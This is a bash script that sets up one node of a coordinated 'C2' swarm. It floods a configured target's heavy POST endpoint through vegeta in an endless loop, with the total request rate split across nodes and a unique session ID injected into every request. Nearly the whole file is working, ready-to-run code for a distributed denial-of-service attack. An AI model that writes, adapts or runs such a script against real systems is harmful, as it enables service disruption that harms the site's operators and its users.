#!/bin/bash
# swarm_deploy.sh -- per-node C2 deployment
# Bridges swarm_config.json to vegeta with per-request UUID injection.
# vegeta cannot template dynamic values from static JSON; this script
# reads the config and runs a Python+vegeta pipeline identical to the
# local PoC but targeting the heavy POST endpoint.
#
# Usage: swarm_deploy.sh <swarm_size>
#   swarm_size: total number of C2 nodes in the swarm.
#   Per-node RPS = max_rps / swarm_size (aggregate stays at max_rps).
SWARM_SIZE=${1:?"Usage: swarm_deploy.sh <swarm_size>"}

# Clean up all child processes on exit (prevent zombie vegeta/python on headless C2)
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

URL=$(jq -r .target_url swarm_config.json)
TOTAL_RPS=$(jq -r .max_rps swarm_config.json)
# awk for float division: bash truncates 850/15=56, missing threshold by 10 RPS.
NODE_RPS=$(LC_ALL=C awk "BEGIN {printf \"%.2f\", $TOTAL_RPS / $SWARM_SIZE}")
HTTP_METHOD=$(jq -r .method swarm_config.json)
UA=$(jq -r '.headers["User-Agent"]' swarm_config.json)
CTYPE=$(jq -r '.headers["Content-Type"]' swarm_config.json)
BODY_TEMPLATE=$(jq -c .body swarm_config.json)

# Python target generator: vegeta HTTP format with unique session_id per request.
# ANSI-C quoting ($'...\n...'): \n = real newline (Python statement separator).
# \\n inside f-string: literal \n for vegeta target line breaks.
PY=$'import uuid,json,sys,signal\nsignal.signal(signal.SIGPIPE,signal.SIG_DFL)\nurl,method,ua,ctype,body_str=sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5]\nbody_tpl=json.loads(body_str)\nwhile True:\n    body_tpl["session_id"]=uuid.uuid4().hex\n    body=json.dumps(body_tpl)\n    print(f"{method} {url}\\nUser-Agent: {ua}\\nContent-Type: {ctype}\\n\\n{body}\\n",flush=True)'

ulimit -n 65535 2>/dev/null || echo "[!] Warning: Could not raise ulimit. Sustained high RPS may cause socket exhaustion."

while true; do
  python3 -c "$PY" "$URL" "$HTTP_METHOD" "$UA" "$CTYPE" "$BODY_TEMPLATE" | \
  vegeta attack -format=http -rate="$NODE_RPS" -duration=5s -timeout=60s | \
  vegeta report -type=json | \
  jq -c '{rate,codes:.status_codes}'
done
